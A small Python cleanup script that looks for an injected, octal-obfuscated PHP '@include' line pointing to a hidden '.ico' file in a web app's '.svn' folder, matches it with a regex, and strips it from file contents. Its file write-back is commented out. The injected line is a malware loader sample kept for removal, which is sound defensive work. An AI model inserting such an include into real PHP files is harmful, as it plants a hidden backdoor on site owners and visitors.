import re
import os
import sys


text = r"""@include "\057h\157m\145/\154e\157s\141t\171e\156/\167e\142a\160p\163/\163a\141s\055t\145n\141n\164/\163a\141s\055t\145n\141n\1641\057c\141s\145-\163t\165d\151e\163/\056s\166n\057p\162o\160-\142a\163e\057.\1411\064a\0619\062d\056i\143o";"""
pat = r'''^@include\s+\"\\\d+h\\\d+m\\\d+/\\\d+e\\\d+s\\\d+t\\\d+e\\\d+/\\\d+e\\\d+a\\\d+p\\\d+/\\\d+a\\\d+s\\\d+t\\\d+n\\\d+n\\\d+/\\\d+a\\\d+s\\\d+t\\\d+n\\141n\\1641\\057c\\141s\\145-\\163t\\165d\\151e\\163/\\\d+s\\\d+n\\057p\\\d+o\\\d+-\\142a\\163e\\\d+\.\\\d+\\\d+a\\\d+\\\d+d\\056i\\143o";$'''
directory = os.path.dirname(os.path.abspath(__file__))
print(directory)
module_name = str(__file__).split('/')[-1:][0]


def remove_pattern(pattern, folder):
    new_data = ""
    for item in os.listdir(folder):
        if os.path.isfile(item):
            print(item)
            if not item == module_name:
                with open(item, 'r+') as source_file:
                    for line in source_file.readlines():
                        print("Searching pattern in %s" % item)
                        res = re.search(pat, line)
                        if res:
                            print("Match found...")
                            print("Removing pattern...")
                            new_line = line.replace(text, ' ')
                            new_data += new_line
                        else:
                            new_data += line
                # with open(item, 'r+') as f:
                #     f.write(new_data)
        elif os.path.isdir(item):
            return remove_pattern(pattern, item)
    print(new_data)


remove_pattern(pattern=None, folder=directory)
